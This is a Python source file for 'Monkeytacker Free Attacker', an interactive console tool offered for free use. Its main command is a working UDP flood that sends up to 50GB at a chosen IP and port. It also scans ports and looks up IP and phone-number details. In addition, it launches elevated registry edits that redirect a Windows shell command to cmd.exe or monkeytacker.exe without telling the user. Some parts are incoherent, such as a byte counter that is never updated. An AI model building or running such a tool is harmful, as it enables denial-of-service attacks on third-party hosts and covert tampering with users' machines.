import os
import socket
import threading
import time
from faker import Faker
import ctypes
import sys
import platform
import requests

os.system("Monkeytacker")

def is_windows_11_se():
    # Get the Windows version number
    version = platform.version()
    # Define the pattern for Windows 11 SE
    windows_11_se_pattern = "10.0.22000"
    # Check if the pattern matches
    return windows_11_se_pattern in version

def change_terminal_name():
    # Command script to change the terminal name
    cmd_script = "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\open\\command\" /v DelegateExecute /d \"cmd.exe\" /f"
    monkeytacker_script = "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\open\\command\" /v DelegateExecute /d \"monkeytacker.exe\" /f"

    if is_windows_11_se():
        # Change the terminal name if Windows 11 SE
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + monkeytacker_script, None, 1)
    else:
        # Change the terminal name in a popup window
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", "/c " + cmd_script, None, 1)

# Create a Faker object
fake = Faker()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    help_menu = """
dos - denial of service attack, ex: dos 206.212.246.14:53
sdos - stops the denial of service attack, ex: sdos
ping - ping a site, ex: ping 206.212.246.14
cport - check the port of site, ex: cport 206.212.246.14 22,53,80,25655
ipinfo - check IP address's details, ex: ipinfo 206.212.246.14
phoneinfo - check phone number's details, ex: phoneinfo 323 720 41 88
ipgen - generate a fake IP, ex: ipgen
exit - close the code, ex: exit
"""
    print(help_menu)

def yellow_to_red_gradient(text):
    gradient_text = ""
    for char_index, char in enumerate(text):
        yellow_value = 255 - char_index * 255 // len(text)
        red_value = char_index * 255 // len(text)
        gradient_text += f"\033[38;2;255;{yellow_value};{red_value}m{char}"
    return gradient_text

def dos_attack(target_ip, target_port):
    global attack_running
    # Set the payload size (in bytes)
    PAYLOAD_SIZE = 1024  # Adjust this if you want a larger payload

    # Set the total size to flood (in bytes)
    TOTAL_SIZE_GB = 50
    TOTAL_SIZE_BYTES = TOTAL_SIZE_GB * 1024 * 1024 * 1024  # 50GB

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Generate a payload of specified size
    payload = b'X' * PAYLOAD_SIZE

    # Send the payload repeatedly until the total size is reached
    sent_bytes = 0
    while sent_bytes < TOTAL_SIZE_BYTES and attack_running:
        sock.sendto(payload, (target_ip, target_port))
        sent_bytes += PAYLOAD_SIZE

    # Close the socket
    sock.close()

def start_dos_attack(command):
    global attack_running
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format. Please enter in the format 'dos <IP>:<PORT>'")
        
        target_info = parts[1].split(":")
        if len(target_info) != 2:
            raise ValueError("Invalid target format. Please enter in the format 'IP:PORT'")

        target_ip = target_info[0]
        target_port = int(target_info[1])

        attack_running = True

        # Start the DoS attack in a new thread
        dos_thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        dos_thread.start()

        # Print completion message
        print("[M] Attack started")
    except ValueError as ve:
        print("[M] You have entered wrong IP or Port")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def ping_ip(target_ip):
    ping_command = f"ping {target_ip} -n 4"
    response = os.popen(ping_command).read()
    print(response)

def start_ping_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        ip = parts[1]
        ping_ip(ip)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def check_open_ports(ip, ports):
    open_ports = []
    try:
        for port_str in ports.split(","):
            port = int(port_str)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        if len(open_ports) > 0:
            print(f"[M] The following ports are open on {ip}: {', '.join(map(str, open_ports))}")
        else:
            print(f"[M] No open ports found on {ip}")
    except ValueError:
        print("[M] Invalid port format. Please enter comma-separated port numbers.")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url)
        data = response.json()

        if data["status"] == "success":
            print("[M] IP Address Details:")
            print(f"IP Address: {data['query']}")
            print(f"Country: {data['country']}")
            print(f"City: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Latitude: {data['lat']}")
            print(f"Longitude: {data['lon']}")
            print(f"AS: {data['as']}")
        else:
            print(f"[M] Unable to fetch details for IP address: {ip}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def get_phone_info(phone_number):
    try:
        url = f"http://apilayer.net/api/validate?access_key=your_access_key&number={phone_number}&country_code=TR&format=1"
        response = requests.get(url)
        data = response.json()

        if data["valid"]:
            print("[M] Phone Number Details:")
            print(f"Phone Number: {data['international_format']}")
            print(f"Country Prefix: {data['country_prefix']}")
            print(f"Country Code: {data['country_code']}")
            print(f"Country Name: {data['country_name']}")
            print(f"Location: {data['location']}")
            print(f"Carrier: {data['carrier']}")
        else:
            print(f"[M] Unable to fetch details for phone number: {phone_number}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def generate_fake_ip():
    fake_ip = fake.ipv4()
    print(f"[M] Fake IP: {fake_ip}")

# Initialize global variables
attack_running = False
attack_bytes_sent = 0

# Clear the screen
clear_screen()

# Print the gradient text
gradient_text = """
         ||                    
         ||                    Monkeytacker Free Attacker
        _;|                    > Made by Sempiller
       /__3                    > Credits to Hatchinng
      / /||                    > discord.gg/CDnN2BtSbG
     / / // .--.               
     \ \// / (OO)              
      \//  |( _ )              #FuckPaidTools
      // \__/`-'\__            
     // \__      _ \           
 _.-'/    | ._._.|\ \          
(_.-'     |      \ \ \         
   .-._   /    o ) / /         
  /_ \ \ /   \__/ / /          
    \ \_/   / /  E_/           
     \     / /                 
      `-._/-'                  
 
Type 'help' for commands
"""

print(yellow_to_red_gradient(gradient_text))

# User input loop
while True:
    user_input = input("Monke$ >>> ")

    if user_input.lower() == "help":
        show_help()
    elif user_input.lower() == "exit":
        break
    elif user_input.lower().startswith("dos"):
        if attack_running:
            print("[M] Another attack is already running. Please wait until it completes.")
        else:
            start_dos_attack(user_input)
    elif user_input.lower().startswith("ping"):
        start_ping_command(user_input)
    elif user_input.lower().startswith("cport"):
        parts = user_input.split()
        if len(parts) != 3:
            print("[M] Invalid command format. Please enter in the format 'cport <IP> <port1,port2,...>'.")
        else:
            check_open_ports(parts[1], parts[2])
    elif user_input.lower().startswith("ipinfo"):
        parts = user_input.split()
        if len(parts) != 2:
            print("[M] Invalid command format. Please enter in the format 'ipinfo <IP>'.")
        else:
            get_ip_info(parts[1])
    elif user_input.lower().startswith("phoneinfo"):
        parts = user_input.split()
        if len(parts) != 2:
            print("[M] Invalid command format. Please enter in the format 'phoneinfo <phone_number>'.")
        else:
            get_phone_info(parts[1])
    elif user_input.lower().startswith("ipgen"):
        generate_fake_ip()
    elif user_input.lower() == "sdos":
        if attack_running:
            print("[M] Stopping the DoS attack.")
            attack_running = False
        else:
            print("[M] No DoS attack is currently running.")
    else:
        print("Invalid command. Type 'help' for available commands.")

    if not attack_running and attack_bytes_sent > 0:
        print(f"[M] Attack Completed, {attack_bytes_sent / (1024 * 1024 * 1024)}GB Used for this Attack.")
        attack_bytes_sent = 0

if __name__ == "__main__":
    change_terminal_name()
